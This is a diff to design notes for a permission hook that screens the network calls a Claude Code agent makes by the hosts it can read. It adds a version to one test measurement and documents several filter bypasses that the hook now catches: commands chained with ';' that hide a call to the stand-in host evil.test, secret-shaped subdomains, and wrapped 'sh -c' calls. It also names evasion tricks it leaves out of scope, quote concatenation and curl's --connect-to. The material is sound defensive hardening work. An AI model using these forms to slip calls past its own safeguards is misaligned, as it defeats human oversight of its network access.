@@ -54,8 +54,8 @@ Unattended runs probably need no switch. The hooks reference says that for `"ask
 the reason is "shown to the user in the permission prompt. When Claude Code denies the
 call in a `-p` run where no one can answer that prompt, Claude reads the reason in the
 tool result instead." That implies a `-p` run with nobody to answer is denied.
-**Measured 2026-10-25:** gate-block-contract.bats' ask canary passes, so a `-p` run
-denies an ask that nobody answers.
+**Measured 2026-10-25 with Claude Code 2.1.308:** gate-block-contract.bats' ask
+canary passes, so a `-p` run denies an ask that nobody answers.
 
 `"ask"` also holds in auto mode. The reference says a hook's `"ask"` "forces a
 permission prompt in auto mode: the classifier can still deny the tool call, but it
@@ -318,6 +318,18 @@ compass did, enabled in this repo's committed settings. The wave reads:
   that does: `curl https://ok.test/x; curl https://evil.test` read only
   `ok.test`, because the `;` made `evil.test` unparseable and the filter dropped
   it. A tool named by path (`/usr/bin/curl`, `./nc`) counts as a network tool too.
+  The final review found three more ways a readable host could carry a call,
+  and each now asks instead. A command in the line that runs a network tool
+  but names no readable host (`echo https://api.github.com; nc evil.test 80`)
+  makes the call unreadable; the line is split on `;`, `|`, `&`, parentheses,
+  backticks and newlines, ignoring quotes. curl, wget, http, https and xh read
+  a bare `name.tld` word as a host, so `curl … evil.test/x` lists evil.test.
+  A candidate shaped like a secret (`https://<key>.evil.test/`) is unreadable
+  and never logged. A WebFetch URL with a backslash, whitespace or a control
+  character is unreadable, because a URL parser reads it differently from
+  grep. A tool opened by a quote (`sh -c 'curl …'`) is seen as well.
+  Command text crafted to evade customs (quote concatenation, curl's
+  `--connect-to`) is out of scope: customs assumes it is not.
 - **Ask fatigue.** If some legitimate pair comes up often, the answer is a settings
   pair, and the wave's data says which pairs to build in. If asks come mostly from
   test fixtures, the next step is a skip for fixture paths, not loosening the default.
